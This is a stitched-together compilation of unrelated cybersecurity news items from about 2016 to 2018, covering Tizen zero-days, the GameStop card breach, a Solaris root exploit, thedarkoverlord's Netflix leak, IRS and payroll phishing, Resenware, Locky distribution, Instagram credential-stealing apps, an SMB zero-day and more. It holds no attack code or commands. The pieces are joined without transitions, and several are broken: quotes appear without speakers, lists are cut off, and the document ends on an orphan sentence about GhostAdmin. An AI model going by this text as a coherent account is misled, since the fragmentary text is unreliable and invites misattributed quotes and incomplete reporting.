Tizen powers Samsung products like smart TVs, smartwatches like the Gear series and even mobile phones like the Samsung Galaxy Z lineup.
Samsung is seeking to expand the Tizen offerings to more products and more markets, as is evident from the expansion of the Galaxy Z smartphones and the Gear smartwatches.
As security researcher Amihai Neiderman of Equus Software mentioned to Motherboard, Samsung’s Tizen OS has as many as 40 zero-day vulnerabilities still active and posing threat to the security of the operating system.
These vulnerabilities allow someone to remotely hack “millions” of newer Samsung smart TVs, smartwatches and mobile phones, both already on the market as well as ones slated for future release as Samsung does not know and has not fixed these vulnerabilities (hence, “zero day”).
You can see that nobody with any understanding of security looked at this code or wrote it.
It’s like taking an undergraduate and letting him program your software”.
All of the vulnerabilities allow remote code execution on a Samsung device.
One of these vulnerabilities even exploits a flaw in the design of Samsung’s TizenStore app to hijack the software and deliver malicious code to a Samsung TV.
Worse, the TizenStore app operates with the highest privileges on a Tizen device, so such a vulnerability is an even bigger cause of worry as Mr. Neiderman says that you can update a Tizen system with any malicious code the hacker wants.
The TizenStore does use authentication for making sure only authorized Samsung software gets installed, but a heap-overflow vulnerability allows for gaining control before the authentication kicks in.
The researcher mentions that a lot of the Tizen code base is old and borrows from previous projects like Bada.
But most of the vulnerabilities he found were in new code specifically written for Tizen within the last two years.
The vulnerabilities are described as “mistakes programmers were making twenty years ago” to indicate that Samsung lacked basic code development and review practices for Tizen.
When contacted, Samsung sent the researcher an automated email in response.
Samsung’s current smartphone lineup is heavily dependent on Android, so these news shouldn’t necessarily impact your opinion of their Android smartphones in particular.
But Samsung’s other avenues that involve Tizen are likely to invite hackers to explore and find more of such zero-day vulnerabilities.
There needs to be a higher priority on Tizen’s security if Samsung ever wants Tizen to bean OS for the internet of things.

GameStop customers received breach notification warnings this week, cautioning them that their personal and financial information could have been compromised nine months ago.
According to postal letters sent to customers, GameStop said an undisclosed number of online customers had their credit card or bankcard data stolen, including the card numbers, expiration dates, names, addresses and the three-digit card verification values (CVV2).
The breach occurred between Aug 10, 2016 to Feb 9, 2017, according to GameStop. In April, the company publicly acknowledged the breach. But, it wasn’t until last week that affected customers were individually notified that their cards were likely stolen.
“I’m pretty upset at GameStop. I should have been notified when they knew about it in April,” said GameStop customer Ryan Duff, a former cyber operations tactician at U.S. Cyber Command.
As a security professional, he said he expected better of GameStop when it came to notifying him of a possible breach of his credit card information. Subsequently, Duff said, the card used on GameStop.com back in November had been compromised, according to his bank.
“There is no way it should have taken months to be notified,” he said.
Breach notification laws differ from state to state. But many states, such as Massachusetts, mandate victims be notified “as soon as practicable and without unreasonable delay” or the company may face civil penalties. The rules are there, in part, to allow for consumers to freeze accounts and avoid paying fees associated with having their card stolen.
“After receiving a report that data from payment card used on www.GameStop.com may have been obtained by unauthorized individuals, we immediately began an investigation and hired a leading cybersecurity firm to assist us,” wrote J. Paul Raines, chief executive officer of GameStop in a letter dated June 2 that was sent sent to impacted customers.
“Although the investigation did not identify evidence of unauthorized access to payment card data, we determined on April 18, 2017 that the potential for what to have occurred existed for certain transactions,” he wrote.
GameStop operates 7,500 retail stores and its consumer product network online includes GameStop.com, game site Kongregate.com and online retailer ThinkGeek. No retail customers were impacted by the breach, according to the company.
“GameStop identified and addressed a potential security incident that was related to transactions made on GameStop’s website during a specific period of time,” the company said in a statement provided to Threatpost. “GameStop mailed notification letters to customers who made purchases during that time frame advising them of the incident and providing information on steps they can take.”
Still unknown about the breach are how many customers may have been impacted, how was the data stolen and how was GameStop alerted to the fact the data had been stolen.
In April, GameStop issued the statement: “GameStop recently received notification from a third party that it believed payment card data from cards used on the GameStop.com website was being offered for sale on a website.”
Krebs on Security reported in April that GameStop had received an alert from a credit card processor stating that its website was potentially comprised.
Originally, it was believed that the breach involved GameStop retail stores and that the company’s point-of-sale system may have been infected with malware. That was because the breach occurred at the height of the holiday sales season and that stolen data included card verification values (CVV2). Online merchants are not supposed to store CVV2 codes on their e-commerce sites.
However, since GameStop said no retail customers were impacted, it is now believed that GameStop.com was hacked and that the data was stolen through the use of malware.
Over the past 12 months, there has been an unprecedented number of data breaches. Some of those impacted have been ecommerce sites running vulnerable versions of Magento and WordPress and ecommerce platforms Powerfront CMS and OpenCart.
Criminals have used a number of techniques to siphon off credit card data from these sites ranging from compromised ecommerce plugins that can perform reflected XSS (cross-site scripting) attacks, web-based keyloggers, and DOM-based XSS attacks.
Over 2,000 WordPress sites are infected as part of a keylogger campaign that leverages an old malicious script.

A vulnerability in some versions of the Oracle Solaris enterprise OS could allow attackers to edit code in the memory and exploit it to gain full root control over a machine.
The privilege escalation vulnerability -- now patched -- is present in current versions of Oracle Solaris 10 and 11 running Sun StorageTek Availability Suite (AVS) for the filesystem and could be used to access to a low-level user or service account and, from there, gain complete root access to the system.
The memory corruption bug has been uncovered and detailed by researchers at Trustwave -- and its origins go all the way back to 2007. The original issue was disclosed in 2009 and apparently fixed, but researchers revisited the code this year only to find the fix was partial and loopholes still allowed the execution of malicious code.
The origins of the exploit, CVE-2018-2892, lie in one small fragment of code which contains a number of separate vulnerabilities around the dereferencing pointer, the means of getting values stored in a specific memory location.
""Attackers can exploit this vulnerability to take access to a low-level user or service account and gain complete root access to the entire system,"" Neil Kettle, application security principal consultant at SpiderLabs at Trustwave, told ZDNet.
An attacker exploiting this vulnerability would need direct access to a user or service account.
""This can be obtained by targeting users with social engineering attacks or by exploiting vulnerabilities in existing services. Once the attacker has access to any account, this vulnerability can be very easily exploited to gain complete root control over the system,"" said Kettle.
While the original 2007 vulnerability has probably been used in the wild, there's no confirmation that the new exploit has been used to conduct an attack. Nonetheless, Trustwave disclosed the discovery to Oracle, which has delivered a patch to fix the loophole.

A hacker who claims to have stolen unreleased television shows from several major networks shared the coming season of the Netflix series “Orange Is the New Black” on Saturday after the person said the streaming service failed to meet its ransom requests.
The breach appears to have occurred at the postproduction company Larson Studios, a popular digital-mixing service in Los Angeles for television networks and movie studios. The hacker or hackers, who go by the name “thedarkoverlord,” also claim to have stolen unreleased content from ABC, Fox, National Geographic and IFC. The Federal Bureau of Investigation learned of the episode at Larson Studios in January but did not start notifying the content companies until a month ago.
A message to Larson Studios was not immediately returned.
On Twitter, thedarkoverlord suggested that other networks would have their shows released next. “Oh, what fun we’re all going to have,” the hacker said. “We’re not playing any games anymore.”
Netflix had announced this year that Season 5 of “Orange Is the New Black” would be released June 9, and it was not immediately clear whether it planned to move up the release date.
In a statement, Netflix said: “We are aware of the situation. A production vendor used by several major TV studios had its security compromised and the appropriate law enforcement authorities are involved.”
This specific breach highlights a risk posed by the weak security practices in the postproduction studios that manage the release of proprietary entertainment content. While companies like Netflix and Fox might invest in state-of-the-art cybersecurity defense technology, they must also rely on an ecosystem of postproduction vendors, ranging from mom-and-pop shops to more sophisticated outfits like Dolby and Technicolor, which may not deploy the same level of cybersecurity and threat intelligence.
In a message posted Saturday, thedarkoverlord criticized Netflix for not meeting its blackmail requests. “It didn’t have to be this way, Netflix,” the message said. “You’re going to lose a lot more money in all of this than what our modest offer was.”
The statement continued: “We’re quite ashamed to breathe the same air as you. We figured a pragmatic business such as yourselves would see and understand the benefits of cooperating with a reasonable and merciful entity like ourselves.”
The hacker threatened to release content from other studios on Saturday if its demands were not met. ABC, Fox and IFC declined to comment, and a message to National Geographic was not immediately returned.
The alias thedarkoverlord has popped up in other recent attacks, including one last January on a small charity in Muncie, Ind., the Little Red Door Cancer Services of East Central Indiana. In that case, the hackers wiped the organization’s servers and backup servers, and demanded 50 bitcoins — valued at $43,000 — to restore the data. The organization did not pay.

Do you trust your tax preparer not to fall for this simple phishing scam?
The Internal Revenue Service is warning tax preparers about a new scam designed to steal their usernames and passwords. The hacker’s goal is to break in to the preparer’s computer system and steal client information.
The IRS advises the bogus email appears to come from the recipient’s software provider and typically has a subject line that reads something like: “Software Support Update” or “Important Software System Upgrade.”
The message tells the preparer they need to revalidate their login credentials and it provides a link to a “fictitious website that mirrors the software provider’s actual login page,” according to an IRS bulletin issued last month. “Instead of upgrading software, the tax professionals are providing their information to cybercriminals who use the stolen credentials to access the preparers' accounts and to steal client information.""
This phishing attack was cleverly designed to launch at the time of year when many software providers release upgrades to professional preparers. It’s also a busy time for preparers who are working to meet the Oct. 15 deadline for clients who filed for extensions.
“This sophisticated scam yet again displays cybercriminals’ tax savvy and underscores the need for tax professionals to take strong security measures to protect their clients and protect their business,” the IRS alert said.
Mike Wyatt, a threat researcher with RiskIQ, a digital threat management firm, told NBC News he’s not surprised to see this current attack. Getting people to click on malicious links requires social engineering — and launching a phishing campaign related to calendar events can be a successful tactic.
“Cybercriminals very often leverage holidays, events and other important dates in their threat campaigns, so it makes perfect sense that a group is capitalizing on the extended tax deadlines coming up,” he said.

The IRS said it had received reports of “multiple takeover incidents” in the past year in which the criminals accessed client tax returns, completed those returns, e-filed them and secretly directed refunds to their own accounts.
The phishing emails that made these takeovers possible “can look convincing, appearing to originate from IRS e-Services” the IRS warned. They have subject lines designed to get a quick response, such as: “Account Closure Now,” “Avoid Account Shutdown,” or “Unlock Your Account Now.” IRS screen captures show that the fake login pages created by the crooks look just like those on the real IRS site.
“We urge tax professionals to be on the lookout for the warning signs of these schemes and many others that can contribute to data loss and identity theft,” IRS Commissioner John Koskinen said in a statement. “A few simple steps can protect tax professionals as well as their clients.”

That's the question posed by a novel piece of ransomware that challenges victims to achieve a high score in a video game instead of demanding cash to unlock files.
""Minamitsu 'The Captain' Murasa encrypted your precious data like documents, musics  [sic], pictures, and some kinda project files,"" a pop-up from the malware, called Resenware, reads.
Research focused Twitter account MalwareHunterTeam tweeted screenshots of Resenware on Thursday.
Victims allegedly have to obtain a certain high score on  Undefined Fantastic Object—a classic style, Japanese vertical shooter—on LUNATIC difficulty.
Resenware's pop-up claims the malware will detect someone playing  Undefined Fantastic Object and their score automatically.
MalwareHunterTeam confirmed in a Twitter direct message to Motherboard that the malware does indeed check that the game is running.
But if someone did get infected by Resenware, they may want to quickly grab a copy—one Amazon listing only has three copies of Undefined Fantastic Object in stock.
""Shmup enthusiasts who hunger for something new being brought to the table in terms of gameplay mechanics will be disappointed, but those enthusiasts seeking a challenge sure won't be!""
a very enthusiastic fan wrote about a demo version of the game back in 2009.

""DO NO TRY CHEATING OR TERMINATE THIS APPLICATION IF YOU DON'T WANT TO BLOW UP THE ENCRYPTION KEY,"" the pop-up continues.
According to MalwareHunterTeam, there are no consequences from editing your score from within the game, a flaw that prompted the Resenware author to release a tool to remove the malware, along with an apology.
""Ransomeware  [sic] is defentely kind of highly fatal malware, but I made it,"" the creator wrote, according to a screenshot posted by MalwareHunterTeam.

This week, Adobe released its monthly scheduled update bundle addressing vulnerabilities within its different products. The Adobe patch Tuesday November updates allegedly fixed numerous vulnerabilities leading to information disclosure. These vulnerabilities existed in Adobe Acrobat/Reader, Flash Player, and Photoshop CC.
The recently released Adobe Patch Tuesday November updates addressed three different vulnerabilities – all resulting in information disclosure.
The first one existed in the Adobe Photoshop CC affecting versions 19.1.6 and prior for both Windows and MacOS. As described in the security advisory, Adobe has fixed this important Out-of-bounds read vulnerability (CVE-2018-15980) in the Photoshop CC versions 19.1.7 and 20.0.
The second information disclosure flaw affected Adobe Reader and Acrobat for Windows. Explaining about the flaw in their advisory, Adobe stated, “Successful exploitation could lead to an inadvertent leak of the user’s hashed NTLM password.”
The vulnerability initially received the CVE number CVE-2018-4993, when Check Point Research first reported the bug. However, as recently disclosed by the EdgeSpot, Adobe only patched a single variant of this bug. Whereas, the EdgeSpot team discovered other variants that hinted towards a failed patching of the bug instead of a new vulnerability.
The patched vulnerability has now received CVE number CVE-2018-15979 “to reflect that the patch is available”.
The third vulnerability addressed this month is an out-of-bounds Read vulnerability (CVE-2018-15978) in the Adobe Flash Player. The affected versions include 31.0.0.122 and earlier for Windows, Linux, and MacOS.
Unlike previous months, the Adobe Patch Tuesday November update bundle addressed fewer bugs. Moreover, none of the patched vulnerabilities had a critical severity impact. In October, Adobe patched 86 different vulnerabilities including 47 critical ones. Whereas, in September, they addressed 6 critical flaws.
Adobe has fixed the bugs CVE-2018-15980 and CVE-2018-15978 in Adobe Photoshop CC versions 19.1.7 and 20.0 and Adobe Flash Player version 31.0.0.148, respectively. Whereas, CVE-2018-15979 has received a patch in Adobe Acrobat DC and Reader DC version 2019.008.20081, Acrobat 2017 and Acrobat Reader DC 2017 version 2017.011.30106, and Acrobat DC and Acrobat Reader DC (Classic 2015) version 2015.006.30457.
For protection against the three important vulnerabilities addressed in November updates, users should make sure to upgrade their software to the patched versions at the earliest convenience.

This Locky spam dip has been seen by multiple observers, such as security firms Avast and Check Point, and security researchers Kevin Beaumont, MalwareTech, MalwareHunterTeam, and others.
According to Check Point, who recently released a report on December's most active malware families, Locky spam numbers have gone down 81%.
Previously, in October, Locky had been ranked as the top malware threat in the world, while now, in December, Locky is not even in the top 10 anymore.
The same thing can also be seen in a chart released by Avast.
Even if the chart doesn't cover the last ten days, Locky spam numbers have remained at the same low levels as during the holidays.
The only tiny trail of activity in the chart above is the Locky ransomware delivered as a second-stage download for Kovter campaigns.
Kovter is a click-fraud malware that infects computers and clicks on invisible ads on the user's behalf.
This malware has been around for years, and recently, it started distributing a wide range of secondary payloads.
In January 2016, Kovter downloaded and installed a proxy client on infected PCs, transforming infected hosts into proxy servers for the ProxyGate web proxy service.
This allowed the Kovter gang to make a side profit by routing web traffic through infected PCs, while also earning money from its main activity: click-fraud.
In the same month, Kovter also started distributing a version of the Nemucod ransomware, for which Fabian Wosar of Emsisoft had successfully created a decrypter.
Disheartened by Wosar's success, the group behind Kovter switched to several ransomware variants in the following months, and eventually settled on renting and distributing Locky starting with October, as part of an affiliate scheme, splitting the ransom payments with the Locky crew.
Researchers looking at Locky infections can easily track Locky infections distributed by the Kovter group by the affiliate IDs 23 and 24, found in Locky's configuration file, present on every infected system.
PhishMe researchers have recently published a blog post detailing the Kovter spam emails that has been distributing Locky ransomware in the past weeks.
At the moment, these spam emails are the only source of Locky infections.
Previously, most of the spam emails distributing Locky came from the spam sent out via Necurs, a botnet of PCs infected with the Necurs bootkit.
The Necurs botnet is the same botnet responsible for the distribution of the Dridex banking trojan, one of the most advanced banking trojans known today.

In total, ESET security researcher Lukas Stefanko discovered 13 apps that appear to have been written by a Turkish developer.
While seven of the 13 apps obviously focused on Turkish-speaking users, the rest targeted users from across the world.
Stefanko says he reported all 13 apps to Google's security team, who removed them from the Play Store last week.
The modus operandi of all these apps was the same.
The app would then collect the user's login details, send them to a remote server, and show a login error.
The error would appear every time the user tried to authenticate, and after a certain number of login attempts, the error would change, and ask the user to visit the official Instagram site instead and authorize the app from there.
When the user visited the Instagram homepage, he would see a notification from Instagram letting him know that someone has accessed his account.
From this point on, if victims don't change their passwords, the crook would use the victim's Instagram account to like images or follow other accounts.
Stefanko believes these apps power online services that offer Instagram likes and followers for money.
Back in January, the researcher discovered a similar app that stole Instagram credentials and targeted Turkish users.
That app, as well, was hosted on the official Google Play Store.
Other ways in which hackers could use the stolen Instagram credentials is to post image ads on people's profiles and to extort some kind of payment from the owners of accounts with a large follower base.
Overall, there have been many cases of apps that stole Instagram credentials in the past few years.
In November 2015, Apple removed an app named ""Who Viewed Your Profile - InstaAgent"" from the App Store because of the same behavior.
Six months later, Google faced a similar incident and was forced to remove two apps named ""Who Viewed Me on Instagram"" and ""InstaCare - Who cares with me?,"" also caught stealing Instagram credentials.

If your paycheck hits your bank account through direct deposit, be on the lookout for emails requesting personal information including log-in credentials -- they could be a phishing scam by hackers who want to access your bank account.
The FBI warning comes as cyber criminals target the online payroll accounts of employees in a variety of industries, especially those in education, healthcare and commercial aviation. 
What is phishing? It's a scam that involves targeting employees through phony emails designed to bait the reader -hence the word ""phishing""-  and capture their login credentials. The login credentials are used to access individual payroll accounts in order to change bank account information, according to the agency; the cyber thieves then block alerts to consumers warning of changes to their direct deposits, which are then redirected to another account, often a prepaid card controlled by scammers.
Employees should hover their cursor over hyperlinks in any emails to view the URL to ensure it's actually related to the company it purports to be from, and any suspicious requests should be forwarded to company IT or HR departments, the FBI advised. 
Most importantly, do not supply login credentials or personally identifying information in response to any email, the agency said.

New statements from Apple make it clear that they do not believe a hacker, or group of hackers, breached any of their systems. This comes after a recent report from Motherboard that a hacker gang called the ""Turkish Crime Family"" is threatening to remotely wipe up to 559 million iPhones by April 7.
The hackers claim they hold an alleged cache of stolen accounts, and their goal is to shake down the big Apple for $75,000 in Bitcoin or Ethereum cryptocurrency. Alternatively, in lieu of those options, they will even accept $100,000 in iTunes gift cards (a potentially risky option for them).
Apple responded to the allegation that the hackers breached its systems, assuring their systems were not compromised, but did not confirm if the hackers do in fact hold an entire collection of Apple IDs and passwords. Whatever information they do have, probably came from previously comprised third-parties.
""If the list is legitimate, it was not obtained through any hack of Apple,"" an Apple spokesperson told Fortune in an email. ""There have not been any breaches in any of Apple's systems including iCloud and Apple ID.""
Even if the data didn't come from an Apple breach, it could still mean your iCloud login details are out there. Fortune suggested that the logins could be from the LinkedIn hack, in which login info from 117 million accounts was sold on the black market site ""The Real Deal."" Though, if the Turkish Crime Family really has 559 million accounts, well, a mere fraction of the 117 million from LinkedIn doesn't really cut it.
The hackers have been sending login information to media companies in an effort to gather attention to their scam. For example, The Next Web received a small fraction of the alleged data from the hackers, and cross-referenced the info with the site Have I Been Pwned, which checks to see if your email or username has been compromised in a hack.
Most of the samples provided to TNW don't appear to have been involved in the LinkedIn hack or other hacks in the Pwned database, but TNW was able to access the accounts with the login information provided by the hackers, so the info looks legitimate. They can't test every login, so the small sample may not be indicative of the whole.
The Turkish Crime Family also noted to TNW that all conversations with Apple were actually kept private and never reported to Motherboard. Instead, the conversation between the Turkish Crime Family and Motherboard were led by a member that has now been removed for his ""inaccuracy"" and ""lack of professionalism,"" an the group denies the authenticity of Motherboard's report. Overall, the hacking team seems to have a hard time sticking to one story.
Now, the hacker group is confirming Apple's statement that its systems have not been breached, and that the stolen data was obtained through previously compromised systems over the last five years. The Turkish Crime Family is, in fact, not contradicting Apple. They did not breach the company, nor did they ever state to Motherboard that they stole the info directly from Apple.
Rather, after Motherboard's breaking March 21 report, a breach was assumed by some news outlets such as BGR, though most media sites never directly stated that the hackers breached Apple. The Turkish Crime Family's initial response to Motherboard, and the group's only statement, was to extort Apple over an alleged cache of iCloud and other Apple email accounts. The group never stated where their cache of data came from until today when they contacted TNW in response to Apple.

Hacker used flaw in web server to access data uploaded to website of holiday and travel association.
Hackers used a flaw in the web server running the website of ABTA, the UK's largest holiday and travel association, to access the data of as many as 43,000 people.
ABTA CEO Mark Tanzer says an ""external infiltrator"" used a vulnerability in the firm's web server to access data provided by its members and some of those members' customers.
ABTA is the UK's largest travel association, representing travel agents and tour operators that sell £32bn of holidays and other travel each year.
It said the unauthorised access -- on 27 February 2017 -- may have affected 43,000 individuals. Around 1,000 of the accessed files may include personal identity information relating to customers of ABTA members, submitted in support of their complaint about an ABTA member. These files relate to complaints uploaded to ABTA after 11 January 2017. Additionally, around 650 files may include personal identity information of ABTA members. But Tanzer said: ""We are not aware of any information being shared beyond the infiltrator.""
The travel trade association said the vast majority of the 43,000 were people who had registered on abta.com, with email addresses and encrypted passwords, or have filled in an online form with basic contact details ""which are types of data at a very low exposure risk to identity theft or online fraud"".
Once it became aware of the intrusion, ABTA notified the third-party suppliers of the abta.com website, who immediately fixed the vulnerability, and the association hired risk consultants to assess the potential extent of the incident.
It has also alerted the Information Commissioner and the police.
""It is extremely disappointing that our web server, managed for ABTA through a third party web developer and hosting company, was compromised, and we are taking every step we can to help those affected,"" said Tanzer.
ABTA said its own systems remained secure and the vulnerability was in the web server for abta.com, which is managed for ABTA through a third-party web developer and hosting company.
The association said that ABTA members or members of the public who have registered on abta.com should immediately change their password and, if they used this password or any variation of it for other accounts, they should change that too. It said ABTA members who have used ABTA's online self-service facility to upload supporting documentation relating to their membership may have had their data accessed, and ""should remain vigilant regarding online and identity fraud"".

The vulnerability was in Struts2, a release of an Apache web server project.
Officials could not say how long the affected software was used by the government, but the vulnerability was fixed on Sunday.
""These types of vulnerability reports are issued daily,"" said Scott Jones, Deputy Chief of IT Security in Canada's Communications Security Establishment, the country's NSA analogue, during a call with media outlets including Motherboard.
""Some hackers on the internet were actively attempting to exploit this vulnerability.""
No other government sites use the affected software, Jones added, but others may be affected.
""Anyone using this technology in the private or public sector should immediately install the patches,"" he said.
""The unpatched version of the software […] had the potential to be exploited,"" Jennifer Dawson, Deputy Chief Information Officer for the Treasury Board of Canada Secretariat, also said during the call with journalists.
According to Gabrielle Beaudoin, director of communications at Statistics Canada, no personal information was taken by the hacker.
""We have data tables, publications [on that server],"" Beaudoin said, adding that no personal or sensitive information was available.
""It's all information that's already in the public domain, but there was an intrusion on that server.""

MacEwan University said its IT systems are secure after the institution was defrauded of nearly $12 million in a phishing scam compounded by human error.
The university learned it was the victim of an attack last Wednesday, Aug 23 after a series of fraudulent emails “convinced university staff to change electronic banking information for one of the university’s major vendors.”
On Friday, Clark Builders — an Edmonton construction and contracting company — confirmed it was the vendor fraudsters posed as in the online attack.
The fraud led university staff members to transfer $11.8 million to a bank account they believed belonged to the vendor, the university said.
MacEwan University spokesperson David Beharry said three relatively low-level staff members were involved in the transfer. He said there was no process in place which required staff members to phone the vendor to confirm the request to change banking information, but that will change.
“We are looking at the levels of staffing it must go through for authorization before somebody changes that,” he said. “There is going to be a secondary and tertiary level of approval before this goes on.”

A few months ago we exclusively reported on a Dark Web vendor selling 1 Billion user accounts stolen from the Chinese Internet giants. Now, another vendor going by the handle of CosmicDark is selling a database containing 100,759,591 user accounts stolen from of Youku Inc., a popular video service in China.
The database according to vendor’s listing was leaked in 2016 and leaked on the Internet this year. Although it is unclear how the database was stolen CosmicDark is selling the whole package for USD 300 (BTC 0.2559). The data contains emails and passwords decrypted with MD5 & SHA1 hashes.
According to the sample data (552 accounts) provided by CosmicDark, most of the emails are based on @163.com, @qq.com, and @xiaonei.com. It must be noted that based on HackRead’s research the encrypted passwords provided in the sample data have already been decrypted and publically available on the Internet. Also, HaveIbeenpwned, a platform where you can check if your account has been compromised has also confirmed the breach.
It is unclear whether Youku Inc. is aware of the breach or has notified its users, however it is evident that it poses a massive privacy threat to their users. Furthermore, vendors in the same marketplace are selling 21 million Gmail and Yahoo accounts, 640,000 decrypted PlayStation accounts, millions of accounts from 11 hacked Bitcoin forums and millions of accounts stolen from 25 hacked vBulletin forums.

A California auto loan company left the names, addresses, credit scores and partial Social Security numbers of up to 1 million people exposed on an insecure online database.
The company behind the database is Alliance Direct Lending Corporation, according to Kromtech Security Research Center, which discovered the data earlier this week. It said the data was found on an unprotected Amazon server and that the data could have been exposed for up to two years.
According to Alliance Direct Lending’s website, the company works with individuals and auto dealership partners to help car owners refinance existing auto loans. Data stored in the cloud was in clear text, according Diachenko. He said data also included several dozen recorded voice conversations with customers that disclosed full Social Security numbers of loan applicants.
Sample data included the names of 114 car dealerships. According to Kromtech, it estimated between 550,000 to 1.1 million loan records from those dealers were exposed online. Dealers were located across the United States from California, Colorado, Florida and Massachusetts. 
Kromtech said it was unsure if additional third parties may have accessed the data.
Privacy experts said the data in the hands of the wrong person would be a nightmare for victims. A criminal that knows the data comes from people who have refinanced their car loan and may have less than stellar credit, coupled with partial Social Security numbers, would be a dream come true.
“Things could go wrong on a variety of levels. The data could be used to phish additional data via email or phone scams. That’s not even mentioning the reputational damage to those in the database with bad credit scores,” said Adam Levin, chairman and founder of CyberScout.
The data found by Kromtech was on an Amazon’s AWS S3 server. AWS S3 is marketed as an easy-to-use web service that allows businesses to store and retrieve data at a moment’s notice. Data is stored in what Amazon calls buckets.
“The Kromtech Security Research Center has seen an increase in vulnerable AWS S3 buckets recently due to misconfigurations or public settings,” Diachenko said. “We have identified hundreds of misconfigured instances and we have been focused on helping to secure them as soon as we identify who the data belongs to.”
He said companies should consider Alliance Direct Lending’s example a sobering reminder that companies and individuals need to make sure their data is secure.
For Diachenko, this is the latest in a string of insecure database he has helped uncover. In January, he was part of a research team that found 400,000 audio files associated with a Florida company’s telemarketing efforts were stored insecurely online. In February, Kromtech researchers found tens of thousands of sensitive documents insecurely stored online belonging to a print and marketing firm.
Thousands of resumes and job applications from U.S. military veterans, law enforcement, and others were leaked by a recruiting vendor in an unsecured AWS S3 bucket.

Adobe is no stranger to finding itself in the security headlines for all the wrong reasons, and it seems that things may not be changing as we enter 2017.
There was controversy earlier this month when news broke about how Adobe took the opportunity on Patch Tuesday of using its regular security updates to force Adobe Acrobat DC users into silently installing a Google Chrome extension.
As Bleeping Computer reports, most people first found out about the extension, which offers the ability to easily convert webpages into PDF files, when they saw a prompt asking them to approve the following permissions:
Of course, you could choose to remove the extension, but it’s the “Enable” option which is set by default – and it is probably what many people would click on without thinking of the possible consequences.
Users expressed their outrage on social media about Adobe silently installing the Windows-only extension, leaving poor reviews in the Chrome web store:
“How DARE Adobe install this extension automatically and silently as part of a ‘security’ update for Acrobat.
Not only am I removing the extension from the browser, I am permanently removing Acrobat from ALL systems on my network and blocking any further installations.
My school district will be Acrobat free AS SOON AS HUMANLY POSSIBLE.
Further, I will recommend to the Department of Education a different solution for PDF viewing and editing.
I will push and fight to get as many people as I can to stop using this disgusting trash”.
What further upset some users was that the Adobe Acrobat Chrome extension sends “anonymous product usage data” back to Adobe, although the company stresses that it does not receive details of the URLs visited by users.
It wasn’t long before headlines appeared comparing the sneakily-installed extension to “spyware”.
Well, perhaps…
Controversial Google security researcher Tavis Ormandy’s interest was piqued by all of the attention being given to the extension, so he made his own examination of its code and found that it was vulnerable to cross-site scripting (XSS) attacks.
According to statistics displayed on the Chrome web store, the controversial extension has tens of millions of users – all of whom are potentially vulnerable because of the flaw in its code.
Every time you add additional software to your computer, you are increasing your potential attack surface.
And be wary of software that is installed without your permission or that vendors bundle with their software against your wishes.
Adobe has responded to Ormandy’s report by saying it has now issued an update to the extension that fixes the security holes.

Last week, the Internal Revenue Service (IRS) issued a new warning to employers, urging them to stay alert as reports of compromised W-2 records started to climb.
This newest advisory aligns with the agency's plan to delay refunds for those filing their returns early in order to combat identity theft and fraud.
The IRS also informed employers the W-2 scam has moved beyond corporations, expanding to include schools, tribal organizations, and nonprofits.
In a statement, IRS Commissioner, John Koskinen, said the scams - sometimes known as Business Email Compromise (BEC) attacks - are some of the most dangerous email scams the agency has seen in a long time.
[ Learn about top security certifications: Who they're for, what they cost, and which you need.
""It can result in the large-scale theft of sensitive data that criminals can use to commit various crimes, including filing fraudulent tax returns.
We need everyone’s help to turn the tide against this scheme,"" Koskinen said.
In 2016, at least 145 organizations fell victim to BEC scams, exposing tens of thousands of employees to tax fraud and identity theft.
Salted Hash kept track of some of the high-profile cases, and Databreaches.net tracked everything, resulting in a massive list of documented successful attacks.
As of February 5, 23 organizations have disclosed BEC-related data breaches publicly, each one resulting in compromised W-2 data.
The confirmed BEC victims include ten school systems, a software development firm, a utility company in Pennsylvania, at least one restaurant in Indianapolis, and businesses operating within the healthcare, finance, manufacturing, and energy sectors.
Distribution International emailed employees that their W-2 data was compromised on January 27.
Their notification expands the number of affected taxpayers to more than 30,000.
The scammers spoofed an email and pretended to be one of the company's owners.
W-2 records for all companies and all employees were compromised.
Salted Hash reached out to Sky Climber's CFO, Jeff Caswell, for more information.
Also, the College of Southern Idaho has reported an incident that could impact 3,000 employees.
According to Public Information Officer Doug Maughan, the W-2 records affected belong to seasonal and auxiliary staff.
Palomar College disclosed an attack on January 30, which affected employee W-2 records.
The school didn't say the incident was the result of a BEC attack, but Salted Hash is listing it anyway due to the timing of the attack and the information targeted.
Finally today, the West Michigan Whitecaps - a Class A minor league baseball team affiliated with the Detroit Tigers - said staff W-2 records were compromised after someone posing as a manager requested them.
In 2016, the criminals behind the BEC attacks mostly focused on payroll and tax records.
This year though, the IRS says that in addition to the usual records request, the scammers are now following-up and requesting wire transfers.
""Although not tax related, the wire transfer scam is being coupled with the W-2 scam email, and some companies have lost both employees’ W-2s and thousands of dollars due to wire transfers,"" the IRS explained in their warning.
""Employers should consider creating an internal policy, if one is lacking, on the distribution of employee W-2 information and conducting wire transfers.""
BEC attacks are essentially Phishing scams, or Spear Phishing since the criminals have a specific target.
They're effective too, exploiting the trust relationships that exist within the corporate environment.
In a majority of the reported cases from 2016, the attackers forged an email and pretended to be the victim organization's top executive, or someone with direct authority.
Often it is the CEO or CFO, but any high-level manager will work.

The zero-day memory corruption flaw resides in the implementation of the SMB (server message block) network file sharing protocol that could allow a remote, unauthenticated attacker to crash systems with denial of service attack, which would then open them to more possible attacks.
According to US-CERT, the vulnerability could also be exploited to execute arbitrary code with Windows kernel privileges on vulnerable systems, but this has not been confirmed right now by Microsoft.
Without revealing the actual scope of the vulnerability and the kind of threat the exploit poses, Microsoft has just downplayed the severity of the issue, saying:
""Windows is the only platform with a customer commitment to investigate reported security issues, and proactively update impacted devices as soon as possible.
We recommend customers use Windows 10 and the Microsoft Edge browser for the best protection.""
However, the proof-of-concept exploit code, Win10.py, has already been released publicly for Windows 10 by security researcher Laurent Gaffie and does not require targets to use a browser.
The memory corruption flaw resides in the manner in which Windows handles SMB traffic that could be exploited by attackers; all they need is tricking victims to connect to a malicious SMB server, which could be easily done using clever social engineering tricks.
""In particular, Windows fails to properly handle a server response that contains too many bytes following the structure defined in the SMB2 TREE_CONNECT Response structure,"" CERT said in the advisory.
""By connecting to a malicious SMB server, a vulnerable Windows client system may crash (BSOD) in mrxsmb20.sys.""
Since the exploit code is now publicly available to everyone and there is no official patch from Microsoft, all Windows users are left open to potential attacks at this time.
Until Microsoft patches the memory corruption flaw (most probably in the upcoming Windows update or out-of-band patch), Windows users can temporarily fix the issue by blocking outbound SMB connections (TCP ports 139 and 445 and UDP ports 137 and 138) from the local network to the WAN.

Named GhostAdmin, this threat is part of the ""botnet malware"" category.
